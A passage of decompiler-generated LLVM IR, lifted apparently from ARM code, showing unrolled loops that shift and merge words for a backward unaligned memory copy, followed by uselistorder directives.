  %v5_16e64 = or i32 %v3_16e60, %v4_16e64
  store i32 %v5_16e64, i32* %r5.global-to-local, align 4
  %v3_16e68 = mul i32 %v6_16e50, 256
  %v4_16e6c = udiv i32 %v3_16e50, 16777216
  %v5_16e6c = or i32 %v3_16e68, %v4_16e6c
  store i32 %v5_16e6c, i32* %r4.global-to-local, align 4
  %v1_16e70 = add i32 %v0_16e70, -16
  %v2_16e70 = inttoptr i32 %v1_16e70 to i32*
  store i32 %v5_16e6c, i32* %v2_16e70, align 4
  %v4_16e70 = add i32 %v0_16e70, -12
  %v5_16e70 = inttoptr i32 %v4_16e70 to i32*
  %v6_16e70 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16e70, i32* %v5_16e70, align 4
  %v7_16e70 = add i32 %v0_16e70, -8
  %v8_16e70 = inttoptr i32 %v7_16e70 to i32*
  %v9_16e70 = load i32, i32* @ip, align 4
  store i32 %v9_16e70, i32* %v8_16e70, align 4
  %v10_16e70 = add i32 %v0_16e70, -4
  %v11_16e70 = inttoptr i32 %v10_16e70 to i32*
  %v12_16e70 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16e70, i32* %v11_16e70, align 4
  store i32 %v1_16e70, i32* %r0.global-to-local, align 4
  %v0_16e74 = load i32, i32* %r2.global-to-local, align 4
  %v2_16e74 = add i32 %v0_16e74, -16
  store i32 %v2_16e74, i32* %r2.global-to-local, align 4
  %v6_16e78 = icmp slt i32 %v0_16e74, 16
  br i1 %v6_16e78, label %dec_label_pc_16e7c, label %dec_label_pc_16e4c.dec_label_pc_16e4c_crit_edge

dec_label_pc_16e4c.dec_label_pc_16e4c_crit_edge:  ; preds = %dec_label_pc_16e4c
  %v0_16e4c.pre = load i32, i32* @r3, align 4
  %v0_16e50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e4c

dec_label_pc_16e7c:                               ; preds = %dec_label_pc_16e4c
  %v2_16e7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16e7c, i32* @r4, align 4
  %v5_16e7c = load i8*, i8** %stack_var_-8, align 4
  %v6_16e7c = ptrtoint i8* %v5_16e7c to i32
  store i32 %v6_16e7c, i32* @r5, align 4
  store i32 %v11_16e48, i32* @lr, align 4
  %v2_16e80 = add i32 %v0_16e74, -4
  store i32 %v2_16e80, i32* %r2.global-to-local, align 4
  %v4_16e80 = add i32 %v0_16e74, 2147483632
  %v5_16e80 = and i32 %v2_16e80, %v4_16e80
  %v6_16e80 = icmp slt i32 %v5_16e80, 0
  store i1 %v6_16e80, i1* %cpsr_v.global-to-local, align 1
  %v7_16e80 = icmp slt i32 %v2_16e80, 0
  store i1 %v7_16e80, i1* %cpsr_n.global-to-local, align 1
  %v8_16e80 = icmp eq i32 %v2_16e80, 0
  store i1 %v8_16e80, i1* %cpsr_z.global-to-local, align 1
  %v5_16e84 = icmp slt i32 %v2_16e74, -12
  br i1 %v5_16e84, label %dec_label_pc_16ea0, label %dec_label_pc_16e88

dec_label_pc_16e88:                               ; preds = %dec_label_pc_16e7c, %dec_label_pc_16e3c, %dec_label_pc_16e88
  %v1_16e94 = phi i32 [ %v5_16e94, %dec_label_pc_16e88 ], [ %v1_16e70, %dec_label_pc_16e7c ], [ %v0_16e7018, %dec_label_pc_16e3c ]
  %v0_16e88 = load i32, i32* @r3, align 4
  %v3_16e88 = mul i32 %v0_16e88, 256
  store i32 %v3_16e88, i32* %ip.global-to-local, align 4
  %v0_16e8c = load i32, i32* %r1.global-to-local, align 4
  %v1_16e8c = add i32 %v0_16e8c, -4
  %v2_16e8c = inttoptr i32 %v1_16e8c to i32*
  %v3_16e8c = load i32, i32* %v2_16e8c, align 4
  store i32 %v3_16e8c, i32* @r3, align 4
  store i32 %v1_16e8c, i32* %r1.global-to-local, align 4
  %v4_16e90 = udiv i32 %v3_16e8c, 16777216
  %v5_16e90 = or i32 %v4_16e90, %v3_16e88
  store i32 %v5_16e90, i32* @ip, align 4
  %v2_16e94 = add i32 %v1_16e94, -4
  %v3_16e94 = inttoptr i32 %v2_16e94 to i32*
  store i32 %v5_16e90, i32* %v3_16e94, align 4
  %v4_16e94 = load i32, i32* %r0.global-to-local, align 4
  %v5_16e94 = add i32 %v4_16e94, -4
  store i32 %v5_16e94, i32* %r0.global-to-local, align 4
  %v0_16e98 = load i32, i32* %r2.global-to-local, align 4
  %v2_16e98 = add i32 %v0_16e98, -4
  store i32 %v2_16e98, i32* %r2.global-to-local, align 4
  %v6_16e9c = icmp slt i32 %v0_16e98, 4
  br i1 %v6_16e9c, label %dec_label_pc_16ea0.loopexit, label %dec_label_pc_16e88

dec_label_pc_16ea0.loopexit:                      ; preds = %dec_label_pc_16e88
  %v4_16e98 = sub i32 3, %v0_16e98
  %v5_16e98 = and i32 %v4_16e98, %v0_16e98
  %v6_16e98 = icmp slt i32 %v5_16e98, 0
  %v7_16e98 = icmp slt i32 %v2_16e98, 0
  store i1 %v6_16e98, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16e98, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16ea0

dec_label_pc_16ea0:                               ; preds = %dec_label_pc_16ea0.loopexit, %dec_label_pc_16e7c
  %v2_16de450 = phi i32 [ %v5_16e94, %dec_label_pc_16ea0.loopexit ], [ %v1_16e70, %dec_label_pc_16e7c ]
  %v0_16dd446 = phi i32 [ %v2_16e98, %dec_label_pc_16ea0.loopexit ], [ %v2_16e80, %dec_label_pc_16e7c ]
  %v0_16ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ea0 = add i32 %v0_16ea0, 3
  store i32 %v1_16ea0, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16ea8:                               ; preds = %dec_label_pc_16e38
  br i1 %v5_16f18, label %dec_label_pc_16ef4, label %dec_label_pc_16eb0

dec_label_pc_16eb0:                               ; preds = %dec_label_pc_16ea8
  store i32 %v2_16f14, i32* %r2.global-to-local, align 4
  %v3_16eb4 = load i32, i32* @r4, align 4
  store i32 %v3_16eb4, i32* %stack_var_-12, align 4
  %v6_16eb4 = load i32, i32* @r5, align 4
  %v8_16eb4 = inttoptr i32 %v6_16eb4 to i8*
  store i8* %v8_16eb4, i8** %stack_var_-8, align 4
  %v11_16eb4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16eb8

dec_label_pc_16eb8:                               ; preds = %dec_label_pc_16eb8.dec_label_pc_16eb8_crit_edge, %dec_label_pc_16eb0
  %v0_16edc = phi i32 [ %v1_16edc, %dec_label_pc_16eb8.dec_label_pc_16eb8_crit_edge ], [ %v0_16e7018, %dec_label_pc_16eb0 ]
  %v0_16ebc = phi i32 [ %v0_16ebc.pre, %dec_label_pc_16eb8.dec_label_pc_16eb8_crit_edge ], [ %v1_16e28, %dec_label_pc_16eb0 ]
  %v0_16eb8 = phi i32 [ %v0_16eb8.pre, %dec_label_pc_16eb8.dec_label_pc_16eb8_crit_edge ], [ %v2_16e2c, %dec_label_pc_16eb0 ]
  %v3_16eb8 = mul i32 %v0_16eb8, 65536
  store i32 %v3_16eb8, i32* %lr.global-to-local, align 4
  %v1_16ebc = add i32 %v0_16ebc, -4
  %v2_16ebc = inttoptr i32 %v1_16ebc to i32*
  %v3_16ebc = load i32, i32* %v2_16ebc, align 4
  store i32 %v3_16ebc, i32* @r3, align 4
  %v4_16ebc = add i32 %v0_16ebc, -8
  %v5_16ebc = inttoptr i32 %v4_16ebc to i32*
  %v6_16ebc = load i32, i32* %v5_16ebc, align 4
  store i32 %v6_16ebc, i32* %r4.global-to-local, align 4
  %v7_16ebc = add i32 %v0_16ebc, -12
  %v8_16ebc = inttoptr i32 %v7_16ebc to i32*
  %v9_16ebc = load i32, i32* %v8_16ebc, align 4
  store i32 %v9_16ebc, i32* %r5.global-to-local, align 4
  %v10_16ebc = add i32 %v0_16ebc, -16
  %v11_16ebc = inttoptr i32 %v10_16ebc to i32*
  %v12_16ebc = load i32, i32* %v11_16ebc, align 4
  store i32 %v10_16ebc, i32* %r1.global-to-local, align 4
  %v4_16ec0 = udiv i32 %v12_16ebc, 65536
  %v5_16ec0 = or i32 %v4_16ec0, %v3_16eb8
  store i32 %v5_16ec0, i32* %lr.global-to-local, align 4
  %v3_16ec4 = mul i32 %v12_16ebc, 65536
  %v4_16ec8 = udiv i32 %v9_16ebc, 65536
  %v5_16ec8 = or i32 %v3_16ec4, %v4_16ec8
  store i32 %v5_16ec8, i32* @ip, align 4
  %v3_16ecc = mul i32 %v9_16ebc, 65536
  %v4_16ed0 = udiv i32 %v6_16ebc, 65536
  %v5_16ed0 = or i32 %v3_16ecc, %v4_16ed0
  store i32 %v5_16ed0, i32* %r5.global-to-local, align 4
  %v3_16ed4 = mul i32 %v6_16ebc, 65536
  %v4_16ed8 = udiv i32 %v3_16ebc, 65536
  %v5_16ed8 = or i32 %v3_16ed4, %v4_16ed8
  store i32 %v5_16ed8, i32* %r4.global-to-local, align 4
  %v1_16edc = add i32 %v0_16edc, -16
  %v2_16edc = inttoptr i32 %v1_16edc to i32*
  store i32 %v5_16ed8, i32* %v2_16edc, align 4
  %v4_16edc = add i32 %v0_16edc, -12
  %v5_16edc = inttoptr i32 %v4_16edc to i32*
  %v6_16edc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16edc, i32* %v5_16edc, align 4
  %v7_16edc = add i32 %v0_16edc, -8
  %v8_16edc = inttoptr i32 %v7_16edc to i32*
  %v9_16edc = load i32, i32* @ip, align 4
  store i32 %v9_16edc, i32* %v8_16edc, align 4
  %v10_16edc = add i32 %v0_16edc, -4
  %v11_16edc = inttoptr i32 %v10_16edc to i32*
  %v12_16edc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16edc, i32* %v11_16edc, align 4
  store i32 %v1_16edc, i32* %r0.global-to-local, align 4
  %v0_16ee0 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ee0 = add i32 %v0_16ee0, -16
  store i32 %v2_16ee0, i32* %r2.global-to-local, align 4
  %v6_16ee4 = icmp slt i32 %v0_16ee0, 16
  br i1 %v6_16ee4, label %dec_label_pc_16ee8, label %dec_label_pc_16eb8.dec_label_pc_16eb8_crit_edge

dec_label_pc_16eb8.dec_label_pc_16eb8_crit_edge:  ; preds = %dec_label_pc_16eb8
  %v0_16eb8.pre = load i32, i32* @r3, align 4
  %v0_16ebc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16eb8

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16eb8
  %v2_16ee8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16ee8, i32* @r4, align 4
  %v5_16ee8 = load i8*, i8** %stack_var_-8, align 4
  %v6_16ee8 = ptrtoint i8* %v5_16ee8 to i32
  store i32 %v6_16ee8, i32* @r5, align 4
  store i32 %v11_16eb4, i32* @lr, align 4
  %v2_16eec = add i32 %v0_16ee0, -4
  store i32 %v2_16eec, i32* %r2.global-to-local, align 4
  %v4_16eec = add i32 %v0_16ee0, 2147483632
  %v5_16eec = and i32 %v2_16eec, %v4_16eec
  %v6_16eec = icmp slt i32 %v5_16eec, 0
  store i1 %v6_16eec, i1* %cpsr_v.global-to-local, align 1
  %v7_16eec = icmp slt i32 %v2_16eec, 0
  store i1 %v7_16eec, i1* %cpsr_n.global-to-local, align 1
  %v8_16eec = icmp eq i32 %v2_16eec, 0
  store i1 %v8_16eec, i1* %cpsr_z.global-to-local, align 1
  %v5_16ef0 = icmp slt i32 %v2_16ee0, -12
  br i1 %v5_16ef0, label %dec_label_pc_16f0c, label %dec_label_pc_16ef4

dec_label_pc_16ef4:                               ; preds = %dec_label_pc_16ee8, %dec_label_pc_16ea8, %dec_label_pc_16ef4
  %v1_16f00 = phi i32 [ %v5_16f00, %dec_label_pc_16ef4 ], [ %v1_16edc, %dec_label_pc_16ee8 ], [ %v0_16e7018, %dec_label_pc_16ea8 ]
  %v0_16ef4 = load i32, i32* @r3, align 4
  %v3_16ef4 = mul i32 %v0_16ef4, 65536
  store i32 %v3_16ef4, i32* %ip.global-to-local, align 4
  %v0_16ef8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ef8 = add i32 %v0_16ef8, -4
  %v2_16ef8 = inttoptr i32 %v1_16ef8 to i32*
  %v3_16ef8 = load i32, i32* %v2_16ef8, align 4
  store i32 %v3_16ef8, i32* @r3, align 4
  store i32 %v1_16ef8, i32* %r1.global-to-local, align 4
  %v4_16efc = udiv i32 %v3_16ef8, 65536
  %v5_16efc = or i32 %v4_16efc, %v3_16ef4
  store i32 %v5_16efc, i32* @ip, align 4
  %v2_16f00 = add i32 %v1_16f00, -4
  %v3_16f00 = inttoptr i32 %v2_16f00 to i32*
  store i32 %v5_16efc, i32* %v3_16f00, align 4
  %v4_16f00 = load i32, i32* %r0.global-to-local, align 4
  %v5_16f00 = add i32 %v4_16f00, -4
  store i32 %v5_16f00, i32* %r0.global-to-local, align 4
  %v0_16f04 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f04 = add i32 %v0_16f04, -4
  store i32 %v2_16f04, i32* %r2.global-to-local, align 4
  %v6_16f08 = icmp slt i32 %v0_16f04, 4
  br i1 %v6_16f08, label %dec_label_pc_16f0c.loopexit, label %dec_label_pc_16ef4

dec_label_pc_16f0c.loopexit:                      ; preds = %dec_label_pc_16ef4
  %v4_16f04 = sub i32 3, %v0_16f04
  %v5_16f04 = and i32 %v4_16f04, %v0_16f04
  %v6_16f04 = icmp slt i32 %v5_16f04, 0
  %v7_16f04 = icmp slt i32 %v2_16f04, 0
  store i1 %v6_16f04, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16f04, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16f0c.loopexit, %dec_label_pc_16ee8
  %v2_16de451 = phi i32 [ %v5_16f00, %dec_label_pc_16f0c.loopexit ], [ %v1_16edc, %dec_label_pc_16ee8 ]
  %v0_16dd447 = phi i32 [ %v2_16f04, %dec_label_pc_16f0c.loopexit ], [ %v2_16eec, %dec_label_pc_16ee8 ]
  %v0_16f0c = load i32, i32* %r1.global-to-local, align 4
  %v1_16f0c = add i32 %v0_16f0c, 2
  store i32 %v1_16f0c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_16f14:                               ; preds = %dec_label_pc_16e28
  br i1 %v5_16f18, label %dec_label_pc_16f60, label %dec_label_pc_16f1c

dec_label_pc_16f1c:                               ; preds = %dec_label_pc_16f14
  store i32 %v2_16f14, i32* %r2.global-to-local, align 4
  %v3_16f20 = load i32, i32* @r4, align 4
  store i32 %v3_16f20, i32* %stack_var_-12, align 4
  %v6_16f20 = load i32, i32* @r5, align 4
  %v8_16f20 = inttoptr i32 %v6_16f20 to i8*
  store i8* %v8_16f20, i8** %stack_var_-8, align 4
  %v11_16f20 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16f24

dec_label_pc_16f24:                               ; preds = %dec_label_pc_16f24.dec_label_pc_16f24_crit_edge, %dec_label_pc_16f1c
  %v0_16f48 = phi i32 [ %v1_16f48, %dec_label_pc_16f24.dec_label_pc_16f24_crit_edge ], [ %v0_16e7018, %dec_label_pc_16f1c ]
  %v0_16f28 = phi i32 [ %v0_16f28.pre, %dec_label_pc_16f24.dec_label_pc_16f24_crit_edge ], [ %v1_16e28, %dec_label_pc_16f1c ]
  %v0_16f24 = phi i32 [ %v0_16f24.pre, %dec_label_pc_16f24.dec_label_pc_16f24_crit_edge ], [ %v2_16e2c, %dec_label_pc_16f1c ]
  %v3_16f24 = mul i32 %v0_16f24, 16777216
  store i32 %v3_16f24, i32* %lr.global-to-local, align 4
  %v1_16f28 = add i32 %v0_16f28, -4
  %v2_16f28 = inttoptr i32 %v1_16f28 to i32*
  %v3_16f28 = load i32, i32* %v2_16f28, align 4
  store i32 %v3_16f28, i32* @r3, align 4
  %v4_16f28 = add i32 %v0_16f28, -8
  %v5_16f28 = inttoptr i32 %v4_16f28 to i32*
  %v6_16f28 = load i32, i32* %v5_16f28, align 4
  store i32 %v6_16f28, i32* %r4.global-to-local, align 4
  %v7_16f28 = add i32 %v0_16f28, -12
  %v8_16f28 = inttoptr i32 %v7_16f28 to i32*
  %v9_16f28 = load i32, i32* %v8_16f28, align 4
  store i32 %v9_16f28, i32* %r5.global-to-local, align 4
  %v10_16f28 = add i32 %v0_16f28, -16
  %v11_16f28 = inttoptr i32 %v10_16f28 to i32*
  %v12_16f28 = load i32, i32* %v11_16f28, align 4
  store i32 %v10_16f28, i32* %r1.global-to-local, align 4
  %v4_16f2c = udiv i32 %v12_16f28, 256
  %v5_16f2c = or i32 %v4_16f2c, %v3_16f24
  store i32 %v5_16f2c, i32* %lr.global-to-local, align 4
  %v3_16f30 = mul i32 %v12_16f28, 16777216
  %v4_16f34 = udiv i32 %v9_16f28, 256
  %v5_16f34 = or i32 %v3_16f30, %v4_16f34
  store i32 %v5_16f34, i32* @ip, align 4
  %v3_16f38 = mul i32 %v9_16f28, 16777216
  %v4_16f3c = udiv i32 %v6_16f28, 256
  %v5_16f3c = or i32 %v3_16f38, %v4_16f3c
  store i32 %v5_16f3c, i32* %r5.global-to-local, align 4
  %v3_16f40 = mul i32 %v6_16f28, 16777216
  %v4_16f44 = udiv i32 %v3_16f28, 256
  %v5_16f44 = or i32 %v3_16f40, %v4_16f44
  store i32 %v5_16f44, i32* %r4.global-to-local, align 4
  %v1_16f48 = add i32 %v0_16f48, -16
  %v2_16f48 = inttoptr i32 %v1_16f48 to i32*
  store i32 %v5_16f44, i32* %v2_16f48, align 4
  %v4_16f48 = add i32 %v0_16f48, -12
  %v5_16f48 = inttoptr i32 %v4_16f48 to i32*
  %v6_16f48 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16f48, i32* %v5_16f48, align 4
  %v7_16f48 = add i32 %v0_16f48, -8
  %v8_16f48 = inttoptr i32 %v7_16f48 to i32*
  %v9_16f48 = load i32, i32* @ip, align 4
  store i32 %v9_16f48, i32* %v8_16f48, align 4
  %v10_16f48 = add i32 %v0_16f48, -4
  %v11_16f48 = inttoptr i32 %v10_16f48 to i32*
  %v12_16f48 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16f48, i32* %v11_16f48, align 4
  store i32 %v1_16f48, i32* %r0.global-to-local, align 4
  %v0_16f4c = load i32, i32* %r2.global-to-local, align 4
  %v2_16f4c = add i32 %v0_16f4c, -16
  store i32 %v2_16f4c, i32* %r2.global-to-local, align 4
  %v6_16f50 = icmp slt i32 %v0_16f4c, 16
  br i1 %v6_16f50, label %dec_label_pc_16f54, label %dec_label_pc_16f24.dec_label_pc_16f24_crit_edge

dec_label_pc_16f24.dec_label_pc_16f24_crit_edge:  ; preds = %dec_label_pc_16f24
  %v0_16f24.pre = load i32, i32* @r3, align 4
  %v0_16f28.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16f24

dec_label_pc_16f54:                               ; preds = %dec_label_pc_16f24
  %v2_16f54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16f54, i32* @r4, align 4
  %v5_16f54 = load i8*, i8** %stack_var_-8, align 4
  %v6_16f54 = ptrtoint i8* %v5_16f54 to i32
  store i32 %v6_16f54, i32* @r5, align 4
  store i32 %v11_16f20, i32* @lr, align 4
  %v2_16f58 = add i32 %v0_16f4c, -4
  store i32 %v2_16f58, i32* %r2.global-to-local, align 4
  %v4_16f58 = add i32 %v0_16f4c, 2147483632
  %v5_16f58 = and i32 %v2_16f58, %v4_16f58
  %v6_16f58 = icmp slt i32 %v5_16f58, 0
  store i1 %v6_16f58, i1* %cpsr_v.global-to-local, align 1
  %v7_16f58 = icmp slt i32 %v2_16f58, 0
  store i1 %v7_16f58, i1* %cpsr_n.global-to-local, align 1
  %v8_16f58 = icmp eq i32 %v2_16f58, 0
  store i1 %v8_16f58, i1* %cpsr_z.global-to-local, align 1
  %v5_16f5c = icmp slt i32 %v2_16f4c, -12
  br i1 %v5_16f5c, label %dec_label_pc_16f78, label %dec_label_pc_16f60

dec_label_pc_16f60:                               ; preds = %dec_label_pc_16f54, %dec_label_pc_16f14, %dec_label_pc_16f60
  %v1_16f6c = phi i32 [ %v5_16f6c, %dec_label_pc_16f60 ], [ %v1_16f48, %dec_label_pc_16f54 ], [ %v0_16e7018, %dec_label_pc_16f14 ]
  %v0_16f60 = load i32, i32* @r3, align 4
  %v3_16f60 = mul i32 %v0_16f60, 16777216
  store i32 %v3_16f60, i32* %ip.global-to-local, align 4
  %v0_16f64 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f64 = add i32 %v0_16f64, -4
  %v2_16f64 = inttoptr i32 %v1_16f64 to i32*
  %v3_16f64 = load i32, i32* %v2_16f64, align 4
  store i32 %v3_16f64, i32* @r3, align 4
  store i32 %v1_16f64, i32* %r1.global-to-local, align 4
  %v4_16f68 = udiv i32 %v3_16f64, 256
  %v5_16f68 = or i32 %v4_16f68, %v3_16f60
  store i32 %v5_16f68, i32* @ip, align 4
  %v2_16f6c = add i32 %v1_16f6c, -4
  %v3_16f6c = inttoptr i32 %v2_16f6c to i32*
  store i32 %v5_16f68, i32* %v3_16f6c, align 4
  %v4_16f6c = load i32, i32* %r0.global-to-local, align 4
  %v5_16f6c = add i32 %v4_16f6c, -4
  store i32 %v5_16f6c, i32* %r0.global-to-local, align 4
  %v0_16f70 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f70 = add i32 %v0_16f70, -4
  store i32 %v2_16f70, i32* %r2.global-to-local, align 4
  %v6_16f74 = icmp slt i32 %v0_16f70, 4
  br i1 %v6_16f74, label %dec_label_pc_16f78.loopexit, label %dec_label_pc_16f60

dec_label_pc_16f78.loopexit:                      ; preds = %dec_label_pc_16f60
  %v4_16f70 = sub i32 3, %v0_16f70
  %v5_16f70 = and i32 %v4_16f70, %v0_16f70
  %v6_16f70 = icmp slt i32 %v5_16f70, 0
  %v7_16f70 = icmp slt i32 %v2_16f70, 0
  store i1 %v6_16f70, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16f70, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16f78

dec_label_pc_16f78:                               ; preds = %dec_label_pc_16f78.loopexit, %dec_label_pc_16f54
  %v2_16de452 = phi i32 [ %v5_16f6c, %dec_label_pc_16f78.loopexit ], [ %v1_16f48, %dec_label_pc_16f54 ]
  %v0_16dd448 = phi i32 [ %v2_16f70, %dec_label_pc_16f78.loopexit ], [ %v2_16f58, %dec_label_pc_16f54 ]
  %v0_16f78 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f78 = add i32 %v0_16f78, 1
  store i32 %v1_16f78, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_16f6c, { 0, 2, 1 }
  uselistorder i32 %v3_16f60, { 1, 0 }
  uselistorder i32 %v2_16f58, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16f48, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16f28, { 1, 0 }
  uselistorder i32 %v3_16f24, { 1, 0 }
  uselistorder i32 %v0_16f28, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16f48, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16f00, { 0, 2, 1 }
  uselistorder i32 %v3_16ef4, { 1, 0 }
  uselistorder i32 %v2_16eec, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16edc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16ebc, { 1, 0 }
  uselistorder i32 %v3_16eb8, { 1, 0 }
  uselistorder i32 %v0_16ebc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16edc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_16e94, { 0, 2, 1 }
  uselistorder i32 %v3_16e88, { 1, 0 }
  uselistorder i32 %v2_16e80, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16e70, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_16e50, { 1, 0 }
  uselistorder i32 %v3_16e4c, { 1, 0 }
  uselistorder i32 %v0_16e50, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16e70, { 3, 2, 1, 0 }
  uselistorder i1 %v5_16f18, { 2, 0, 1 }
  uselistorder i32 %v0_16e30, { 1, 0 }
  uselistorder i32 %v0_16f1c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_16e7018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_16e20, { 2, 1, 0 }
  uselistorder i32 %v0_16e20, { 2, 0, 1 }
  uselistorder i32 %v2_16e18, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_16e18, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16e18, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_16e7019, { 2, 1, 0 }
  uselistorder i32 %v11_16df4, { 1, 0 }
  uselistorder i32 %v7_16df4, { 1, 0 }
  uselistorder i32 %v1_16dd4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_16dd4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16dd8, { 1, 0 }
  uselistorder i32 %v7_16dcc, { 0, 2, 1 }
  uselistorder i32 %v10_16dc8, { 1, 0 }
  uselistorder i32 %v9_16dc0, { 1, 0, 2 }
  uselistorder i32 %v6_16dbc, { 1, 0 }
  uselistorder i32 %v2_16db4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_16db4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_16dc4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16da8, { 0, 2, 1 }
  uselistorder i32 %v13_16da4, { 1, 0 }
  uselistorder i32 %v4_16da0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_16da0, { 2, 0, 1 }
  uselistorder i32 %v6_16da8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_16d98, { 0, 2, 1 }
  uselistorder i32 %v16_16d94, { 1, 0 }
  uselistorder i32 %v4_16d90, { 1, 2, 0 }
  uselistorder i32 %v0_16da0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_16d98, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16d84, { 0, 3, 2, 1 }
  uselistorder i32 %v10_16d80, { 1, 0 }
  uselistorder i32 %v1_16d7c, { 1, 0 }
  uselistorder i32 %v10_16d78, { 1, 0 }
  uselistorder i32 %v0_16d78, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16d7c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_16d70, { 0, 2, 1 }
  uselistorder i32 %v2_16d64, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_16d64, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_16d7c36, { 1, 2, 0 }
  uselistorder i32 %v1_16d5c, { 2, 1, 0 }
  uselistorder i32 %v1_16d54, { 2, 3, 1, 0 }
  uselistorder i32 %v2_16d4c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_16d48, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_16d44, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_16d44, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_16d34, { 0, 2, 1 }
  uselistorder i32 %v4_16d30, { 1, 0 }
  uselistorder i32 %v3_16d24, { 1, 0 }
  uselistorder i32 %v1_16d1c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16d10, { 1, 0 }
  uselistorder i32 %v12_16d0c, { 0, 2, 1 }
  uselistorder i32 %v8_16cec, { 1, 0, 2 }
  uselistorder i32 %v5_16cec, { 1, 0, 2 }
  uselistorder i32 %v2_16cec, { 1, 0, 2 }
  uselistorder i32 %v0_16cec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16d0c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16cc8, { 0, 2, 1 }
  uselistorder i32 %v4_16cc4, { 1, 0 }
  uselistorder i32 %v3_16cb8, { 1, 0 }
  uselistorder i32 %v1_16cb0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16ca4, { 1, 0 }
  uselistorder i32 %v12_16ca0, { 0, 2, 1 }
  uselistorder i32 %v8_16c80, { 1, 0, 2 }
  uselistorder i32 %v5_16c80, { 1, 0, 2 }
  uselistorder i32 %v2_16c80, { 1, 0, 2 }
  uselistorder i32 %v0_16c80, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16ca0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16c5c, { 0, 2, 1 }
  uselistorder i32 %v4_16c58, { 1, 0 }
  uselistorder i32 %v3_16c4c, { 1, 0 }
  uselistorder i32 %v1_16c44, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16c38, { 1, 0 }
  uselistorder i32 %v12_16c34, { 0, 2, 1 }
  uselistorder i32 %v8_16c14, { 1, 0, 2 }
  uselistorder i32 %v5_16c14, { 1, 0, 2 }
  uselistorder i32 %v2_16c14, { 1, 0, 2 }
  uselistorder i32 %v0_16c14, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16c34, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_16c70, { 0, 2, 1 }
  uselistorder i32 %v1_16c6c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_16bf0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_16bf0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16c74, { 1, 0, 3, 2 }
